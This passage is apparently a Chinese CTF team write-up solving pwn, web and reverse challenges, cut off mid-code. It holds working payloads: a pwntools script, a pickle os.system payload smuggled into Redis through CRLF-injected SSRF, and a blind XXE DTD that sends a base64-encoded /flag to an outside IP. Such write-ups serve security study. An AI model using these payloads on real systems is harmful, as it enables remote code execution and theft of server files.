src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000887771-38ef610f-f0f8-4119-a0cf-64d42a8e897f.png#averageHue=%23151311&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=93&amp;id=ua4ea2b61&amp;originHeight=139&amp;originWidth=824&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=19767&amp;status=done&amp;style=none&amp;taskId=u2490ad99-dc3a-4047-a7ab-81197a1415c&amp;title=&amp;width=549.3333333333334" alt="image.png"><br>得到flag</p><h2 id="zip">zip</h2><p>nc后用队伍token连接<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1714994481062-c54c911c-25a6-4e4f-af53-dc48ae968a09.png#averageHue=%23050403&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=737&amp;id=ua208fa5a&amp;originHeight=1105&amp;originWidth=1362&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=276409&amp;status=done&amp;style=none&amp;taskId=u0389955e-c2da-41c1-8fc8-da60ae70065&amp;title=&amp;width=908" alt="image.png"><br>源码main函数分析</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">load</span>();</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;7z&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your token:&quot;</span>);<span class="comment">//输入token</span></span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), stdin);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">cmpstr</span>(token, buf)) &#123;<span class="comment">//进行校验</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong token!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">zip</span>(buf);<span class="comment">//压缩文件</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your flag:&quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), stdin);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">cmpstr</span>(<span class="string">&quot;flag&#123;&quot;</span>, buf)) &#123;<span class="comment">//进行校验</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong flag!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">unzip</span>(buf);<span class="comment">//解压</span></span><br><span class="line"></span><br><span class="line">    FILE *f = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;flag.txt not found&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), f);</span><br><span class="line">    <span class="built_in">fclose</span>(f);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag: %s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连接后<br>1.先比较token<br>2.然后用token做密码去压缩<br>3.要用以“flag{”开头的字符串<br>4.得到解压的flag<br>其中<br>token在处理时，在第65置0，所以就要token的前64位<br>3步中要绕过flag{，可以通过传DEL（ASCII:127）删除<br>payload</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;prob03.contest.pku.edu.cn&#x27;</span>, <span class="number">10003</span>, level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Please input your token: &#x27;</span>,</span><br><span class="line">                b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;</span>)#</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;your token:\n&#x27;</span>, b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;flag&#123;&#x27;</span>+b<span class="string">&#x27;\x7f&#x27;</span>*<span class="number">5</span>+b<span class="string">&quot;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpy&quot;</span></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;your flag:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>Web</h1><h2 id="phpsql">phpsql</h2><p>注册admin显示已经存在</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714992887587-02327559-9444-4a1a-a1f9-dd0e928c598d.png#averageHue=%23f8f7f7&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=160&amp;id=uecceb6b4&amp;originHeight=240&amp;originWidth=844&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=20062&amp;status=done&amp;style=none&amp;taskId=u66937d01-7573-4a5c-b7e9-6d7ccce62e4&amp;title=&amp;width=562.6666666666666" alt="image.png"></p><p>结合题目phpsql应该是万能密码注入进入后台<br>直接拿sql语句字典跑</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714993045758-5d5a39af-821d-4573-92f8-1acbce11c6f0.png#averageHue=%23f7f6f6&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=808&amp;id=ue685cc7e&amp;originHeight=1212&amp;originWidth=1740&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=193028&amp;status=done&amp;style=none&amp;taskId=udfec92e2-bd07-4848-98f3-1be74fbbfcc&amp;title=&amp;width=1160" alt="image.png"></p><p>直接跑进去</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714993089174-839db6d3-1ae0-4e02-aa7d-90c465139d17.png#averageHue=%23f8f7f7&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=579&amp;id=uca6f4055&amp;originHeight=868&amp;originWidth=2106&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=102070&amp;status=done&amp;style=none&amp;taskId=uebf09cf5-a2db-485f-acef-b0c9c6471cd&amp;title=&amp;width=1404" alt="image.png"></p><h2 id="pyssrf">pyssrf</h2><p>根据题目与提示pyssrf加什么年代了还用python3.7.1<br><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994494037-64fd117e-7f50-497c-adde-f2b742683b6e.png#averageHue=%23f7f6f5&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=421&amp;id=u05709a18&amp;originHeight=631&amp;originWidth=2358&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=163353&amp;status=done&amp;style=none&amp;taskId=ud0145662-c860-4a16-b1fe-b4c1b7540d4&amp;title=&amp;width=1572" alt="image.png"><br>python3.7.1的环境中,urllib有请求头注入<br>redis 解析<br>GET /?<br>payload<br>padding<br>基本上可以理解为<br>pickle反序列化+redis+rce+ssrf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">opcode=<span class="string">&#x27;&#x27;&#x27;(S&#x27;mkdir ./static;cp /flag ./static/f&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">key=hashlib.md5(<span class="string">&quot;http://test/&quot;</span>.encode()).hexdigest()</span><br><span class="line">value=base64.b64encode(opcode).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;set&#x27;</span>,key,value)</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set <span class="number">0439</span>e<span class="number">1</span>ff<span class="number">2</span>e<span class="number">65</span>e<span class="number">21</span>dcf<span class="number">4</span>bba<span class="number">4</span>c<span class="number">26</span>a<span class="number">0</span>dab<span class="number">2</span> KFM<span class="symbol">nbWtkaXIgLi9</span>zdGF<span class="number">0</span>aW<span class="name">M7</span>Y<span class="number">3</span>AgL<span class="number">2</span>ZsYWcgLi<span class="number">9</span>zdGF<span class="number">0</span>aWMvZicKaW<span class="number">9</span>zC<span class="symbol">nN5</span>c<span class="number">3</span>RlbQou</span><br></pre></td></tr></table></figure><p>构造url</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url<span class="operator">=</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span>?<span class="variable">%0</span>d<span class="variable">%0</span>aset<span class="variable">%200439</span>e<span class="number">1</span>ff<span class="number">2e65</span>e<span class="number">21</span>dcf<span class="number">4</span>bba<span class="number">4</span><span class="keyword">c</span><span class="number">26</span>a<span class="number">0</span>dab<span class="number">2</span><span class="variable">%20</span>KFMnbWtkaXIgLi<span class="number">9</span>zdGF<span class="number">0</span>aWM<span class="number">7</span>Y<span class="number">3</span>AgL<span class="number">2</span>ZsYWcgLi<span class="number">9</span>zdGF<span class="number">0</span>aWMvZicKaW<span class="number">9</span>zCnN<span class="number">5</span><span class="keyword">c</span><span class="number">3</span>RlbQou<span class="variable">%0</span>d<span class="variable">%0</span>apadding<span class="variable">%0</span>d<span class="variable">%0</span>a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994544337-8fb892d3-eb1f-4eb6-8519-8009cbc7f922.png#averageHue=%23fcfcfb&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=636&amp;id=uf7471715&amp;originHeight=954&amp;originWidth=2073&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=172099&amp;status=done&amp;style=none&amp;taskId=ue5891c29-eb99-432b-b100-a8274cef51a&amp;title=&amp;width=1382" alt="image.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">url</span>=test/</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994558947-f9549518-8176-46fa-8351-57e63ed42029.png#averageHue=%23fcfcfb&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=651&amp;id=u073badac&amp;originHeight=976&amp;originWidth=1699&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=145448&amp;status=done&amp;style=none&amp;taskId=u519df234-d0e8-423b-9fcf-86a8a9c6272&amp;title=&amp;width=1132.6666666666667" alt="image.png"></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">static</span>/f</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994569753-437c68fe-8887-4069-b2da-66a5ce52d809.png#averageHue=%23f4f4f4&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=212&amp;id=ubc48bda5&amp;originHeight=145&amp;originWidth=508&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=17040&amp;status=done&amp;style=none&amp;taskId=uc9fa657c-22d7-40c4-b606-19b564e9126&amp;title=&amp;width=741.6666870117188" alt="image.png"><br>打开即可得到flag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994749430-228bc4a8-970d-4ba2-be9e-40588181af13.png#averageHue=%23e9e8e7&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=216&amp;id=u42b4835f&amp;originHeight=186&amp;originWidth=664&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=22735&amp;status=done&amp;style=none&amp;taskId=u011f692d-726d-4248-8c67-5518ae96ede&amp;title=&amp;width=772.6666870117188" alt="image.png"></p><h2 id="fileit">fileit</h2><p>源码有提示<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993406997-f9ee5e83-dd7b-4205-b62b-96a9dc140d30.png#averageHue=%23161616&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=141&amp;id=u612e9f98&amp;originHeight=212&amp;originWidth=856&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=15062&amp;status=done&amp;style=none&amp;taskId=ucc6f4d6c-11a1-4cf6-a0e2-a3284806825&amp;title=&amp;width=570.6666666666666" alt="image.png"><br>测试后发现要打无回显xxe<br>vps创建flag.dtd文件，内容如下：</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">ccc</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; aba SYSTEM &#x27;http://43.143.167.75:8888?x=%file;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">%ccc;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">%aba;</span></span><br></pre></td></tr></table></figure><p>创建完成后，在当前目录起python服务<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993610279-870a1647-d25a-4e40-bb49-5c79545d395b.png#averageHue=%23363534&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=214&amp;id=u42df1cf2&amp;originHeight=321&amp;originWidth=1166&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=32773&amp;status=done&amp;style=none&amp;taskId=u7a0eaf35-9ca7-430d-bb2f-9535f88f7a3&amp;title=&amp;width=777.3333333333334" alt="image.png"><br>payload如下：</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE a [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://43.143.167.75:8888/flag.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">    %xxe;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    ]&gt;</span></span></span><br></pre></td></tr></table></figure><p>初始页面抓包后，post传参：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993694538-4c066cf9-fdf1-4797-8480-57b979fc7e14.png#averageHue=%2395a06c&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=699&amp;id=u4362b49d&amp;originHeight=1048&amp;originWidth=1584&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=243273&amp;status=done&amp;style=none&amp;taskId=u863ea369-8f5f-4208-a767-00ff811e152&amp;title=&amp;width=1056" alt="image.png"><br>发送后，vps就会显示接收的数据<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993724668-023b3aaa-ce9d-4493-bc71-bba222e1d145.png#averageHue=%233e3d3b&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=301&amp;id=u173b80ae&amp;originHeight=452&amp;originWidth=1359&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=59092&amp;status=done&amp;style=none&amp;taskId=ud783355a-defd-4cf3-a73e-ccdb63a3d3f&amp;title=&amp;width=906" alt="image.png"><br>base64解码，拿到flag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993743242-9254f3fc-1ecb-4b04-b0cf-c98c234f8510.png#averageHue=%23ebebea&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=322&amp;id=u1c691f26&amp;originHeight=483&amp;originWidth=998&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=24179&amp;status=done&amp;style=none&amp;taskId=ue2aef635-3d68-400d-8485-5e0b7981eb3&amp;title=&amp;width=665.3333333333334" alt="image.png"></p><h1>Reverse</h1><h2 id="ezayre">ezayre</h2><p>64位无壳elf，拉进ida看看<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765706-a3095736-a5b7-47ba-b23d-866b730cb950.png#averageHue=%23f9f7f7&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=u88596a10&amp;originHeight=547&amp;originWidth=772&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u8ce547ae-6a90-4b8b-b514-63aa2ba03ac&amp;title=" alt=""><br>锁定主要函数是sub_1208，跟进之后有爆红，修好之后加密逻辑如下，看到下图标红处之后，感觉是base64<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765742-1cdb534e-27d7-4cc4-bd45-aa83c1012e4d.png#averageHue=%23f9f9f9&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=u473e1a4e&amp;originHeight=763&amp;originWidth=1028&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u6ad6fd18-57fa-4756-b6d4-ff3312d6be2&amp;title=" alt=""><br>直接查找一下字符串<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765707-401ce508-7aea-4897-b4c8-b0654fdb8d8e.png#averageHue=%23f8f5f3&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=uccc36a39&amp;originHeight=574&amp;originWidth=899&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ube02818f-1435-4679-a1f9-838ade16a94&amp;title=" alt=""><br>看见变表和密文之后直接秒了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765583-e9e645b8-9ff4-46fd-9c35-39f31dbd8769.png#averageHue=%23e7e6e6&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=ufd19f407&amp;originHeight=643&amp;originWidth=1279&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ua3dbb87b-6b69-43c5-885e-877b4c5bed9&amp;title=" alt=""></p><h2 id="babyre">babyre</h2><p>正常脱upx壳之后拉进ida<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765670-b0ad82b2-4f5e-497d-a3c4-2ece25075536.png#averageHue=%23fdfafa&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=u0449cf0a&amp;originHeight=495&amp;originWidth=710&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u7e3cab4e-b008-44e1-9042-057ce5f3d78&amp;title=" alt=""><br>直接把四个函数中的加密逆一下，都是一些基本加密操作，直接爆破一下，注意爆破的取值区间是0~2^32-1,包含所有32无符号整数，把内容合一下，exp如下（PS:第一个函数就加减值加密，不写入函数了就）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1257</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (a1 | <span class="number">0x8E03BEC3</span>) - <span class="number">3</span> * (a1 &amp; <span class="number">0x71FC413C</span>) + a1 == <span class="number">-1876131848</span> )</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_12A4</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x10000000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4</span> * ((~a1 &amp; <span class="number">0xA8453437</span>) + <span class="number">2</span> * ~(~a1 | <span class="number">0xA8453437</span>))</span><br><span class="line">     + <span class="number">-3</span> * (~a1 | <span class="number">0xA8453437</span>)</span><br><span class="line">     + <span class="number">3</span> * ~(a1 | <span class="number">0xA8453437</span>)</span><br><span class="line">     - (<span class="number">-10</span> * (a1 &amp; <span class="number">0xA8453437</span>)</span><br><span class="line">      + (a1 ^ <span class="number">0xA8453437</span>)) == <span class="number">551387557</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1346</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x10000000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">11</span> * ~(a1 ^ <span class="number">0xE33B67BD</span>)</span><br><span class="line">     + <span class="number">4</span> * ~(~a1 | <span class="number">0xE33B67BD</span>)</span><br><span class="line">     - (<span class="number">6</span> * (a1 &amp; <span class="number">0xE33B67BD</span>)</span><br><span class="line">      + <span class="number">12</span> * ~(a1 | <span class="number">0xE33B67BD</span>))</span><br><span class="line">     + <span class="number">3</span> * (a1 &amp; <span class="number">0xD2C7FC0C</span>)</span><br><span class="line">     + <span class="number">-5</span> * a1</span><br><span class="line">     - <span class="number">2</span> * ~(a1 | <span class="number">0xD2C7FC0C</span>)</span><br><span class="line">     + ~(a1 | <span class="number">0x2D3803F3</span>)</span><br><span class="line">     + <span class="number">4</span> * (a1 &amp; <span class="number">0x2D3803F3</span>)</span><br><span class="line">     - <span class="number">-2</span> * (a1 | <span class="number">0x2D3803F3</span>) == <span class="number">0xCE1066DC</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = <span class="number">0xADB1D018</span>LL;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> b = a+<span class="number">0x36145344</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>^<span class="number">32</span> - <span class="number">1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bbq = <span class="built_in">sub_1257</span>(i);</span><br><span class="line"><span class="keyword">if</span>(bbq==<span class="number">0LL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>^<span class="number">32</span> - <span class="number">1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bbq = 